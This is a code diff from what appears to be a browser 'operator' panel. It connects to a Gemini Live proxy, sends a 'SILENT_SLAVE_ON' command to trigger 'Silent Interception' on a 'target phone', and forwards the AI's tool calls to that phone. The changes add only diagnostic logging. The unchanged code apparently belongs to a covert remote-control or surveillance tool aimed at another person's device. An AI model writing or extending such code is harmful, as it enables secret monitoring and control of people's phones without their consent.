@@ -3292,8 +3292,9 @@
             img.src = "data:image/jpeg;base64," + b64;
         }
 
-        function toggleOperatorSession() { 
-            if (opWs && (opWs.readyState === WebSocket.OPEN || opWs.readyState === WebSocket.CONNECTING)) {
+                function toggleOperatorSession() { 
+            if (opWs && (opWs.readyState === WebSocket.OPEN || opWs.readyState === WebSocket.CONNECTING)) { 
+                console.log("[OP_WS_DIAG] Operator session toggle requested while active. Initiating disconnect.");
                 disconnectOperatorSession();
                 return;
             }
@@ -3303,13 +3304,16 @@
             updateOpOrb('connecting');
             
             const workerUrl = "wss://gemini-live-proxy.getyeteklu2.workers.dev";
+            console.log("[OP_WS_DIAG] Connecting to Cloudflare Worker proxy:", workerUrl, "for target:", targetId);
             opWs = new WebSocket(workerUrl);
             
-            opWs.onopen = () => {
+            opWs.onopen = () => { 
+                console.log("[OP_WS_DIAG] WebSocket successfully opened. ReadyState:", opWs.readyState);
                 logOp("🔗 Local browser WebSocket paired successfully.", "status");
                 logOp("Triggering Silent Interception command on target phone...", "status");
                 
                 // Send the Master-Slave control packet over the bound Supabase channel
+                console.log("[OP_WS_DIAG] Sending SILENT_SLAVE_ON broadcast via Supabase for device:", targetId);
                 opChannel.send({
                     type: 'broadcast',
                     event: 'agent_control',
@@ -3317,57 +3321,66 @@
                 });
                 
                 // Initialize local audio context for speaker output
-                if (!opAudioCtx) {
+                if (!opAudioCtx) { 
+                    console.log("[OP_WS_DIAG] Initializing local 24kHz AudioContext pipeline.");
                     opAudioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 24000 });
                     opNextStartTime = opAudioCtx.currentTime;
                 }
             };
             
-            opWs.onmessage = (event) => {
-                try {
+            opWs.onmessage = (event) => { 
+                try { 
                     const response = JSON.parse(event.data);
                     
-                    if (response.serverContent?.outputTranscription?.text) { 
+                    if (response.serverContent?.outputTranscription?.text) {  
                         const text = response.serverContent.outputTranscription.text;
-                        if (opActiveBubble) {
+                        console.log("[OP_WS_DIAG] Received server transcript segment:", text);
+                        if (opActiveBubble) { 
                             opActiveBubble.innerText += text;
                             const box = document.getElementById('op-transcript-box');
                             box.scrollTop = box.scrollHeight;
-                        } else {
+                        } else { 
                             opActiveBubble = logOp(text, 'gemini');
                         }
                     }
                     
-                    if (response.serverContent?.inputTranscription?.text) { 
-                        logOp(response.serverContent.inputTranscription.text, 'you');
+                    if (response.serverContent?.inputTranscription?.text) {  
+                        const text = response.serverContent.inputTranscription.text;
+                        console.log("[OP_WS_DIAG] Received client transcript confirmation:", text);
+                        logOp(text, 'you');
                     }
                     
-                    if (response.serverContent?.interrupted) { 
+                    if (response.serverContent?.interrupted) {  
+                        console.log("[OP_WS_DIAG] Model interrupted. Stopping current audio buffers.");
                         opActiveBubble = null;
                         stopOperatorSpeakerBuffer();
                         updateOpOrb('ready');
                     }
                     
-                    if (response.serverContent?.modelTurn) { 
+                    if (response.serverContent?.modelTurn) {  
                         updateOpOrb('speaking');
                         const parts = response.serverContent.modelTurn.parts;
-                        parts.forEach(part => { 
-                            if (part.inlineData?.data) { 
+                        console.log("[OP_WS_DIAG] Model turn detected containing", parts.length, "part(s).");
+                        parts.forEach(part => {  
+                            if (part.inlineData?.data) {  
                                 const bytes = Uint8Array.from(atob(part.inlineData.data), c => c.charCodeAt(0));
+                                console.log("[OP_WS_DIAG] Playing audio chunk size:", bytes.length, "bytes.");
                                 playOperatorAudioChunk(bytes.buffer);
                             }
                         });
                     }
                     
-                    if (response.serverContent?.turnComplete) { 
+                    if (response.serverContent?.turnComplete) {  
+                        console.log("[OP_WS_DIAG] Model turn execution completed.");
                         opActiveBubble = null;
                         updateOpOrb('ready');
                     }
                     
-                    if (response.toolCall?.functionCalls) { 
+                    if (response.toolCall?.functionCalls) {  
                         updateOpOrb('thinking');
                         const calls = response.toolCall.functionCalls;
-                        calls.forEach(call => { 
+                        calls.forEach(call => {  
+                            console.log("[OP_WS_DIAG] Tool call received from Gemini:", call.name, "ID:", call.id, "Args:", call.args);
                             logOp(`Forwarding tool execution request directly to Phone: '${call.name}'`, "tool");
                             opChannel.send({
                                 type: 'broadcast',
@@ -3379,12 +3392,14 @@
                 } catch(e) { console.error("[OP_WS_PARSE_ERR]", e); }
             };
             
-            opWs.onclose = (e) => { 
+            opWs.onclose = (e) => {  
+                console.error("[OP_WS_DIAG] WebSocket closed. Code:", e.code, "Reason:", e.reason || "None", "Clean:", e.wasClean);
                 logOp(`Session closed. Code: ${e.code}`, "status");
                 disconnectOperatorSession();
             };
             
-            opWs.onerror = () => { 
+            opWs.onerror = (err) => {  
+                console.error("[OP_WS_DIAG] WebSocket connection error encountered inside Worker proxy.", err);
                 logOp("⚠️ WebSocket Connection error inside Worker proxy.", "status");
             };
         }
@@ -3532,6 +3547,7 @@
         }
 
         function disconnectOperatorSession() { 
+            console.log("[OP_WS_DIAG] Disconnecting session. Cleaning up audio and mic streams.");
             stopOperatorMicStream();
             stopOperatorSpeakerBuffer();
             updateOpOrb('offline');
@@ -3546,7 +3562,12 @@
             document.getElementById('op-connect-btn').style.color = "#000";
             
             if (opWs) { 
-                try { opWs.close() } catch(e){}
+                try { 
+                    console.log("[OP_WS_DIAG] Closing WebSocket client connection cleanly.");
+                    opWs.close(); 
+                } catch(e){
+                    console.error("[OP_WS_DIAG] Error closing WebSocket:", e.message);
+                }
                 opWs = null;
             }
         }
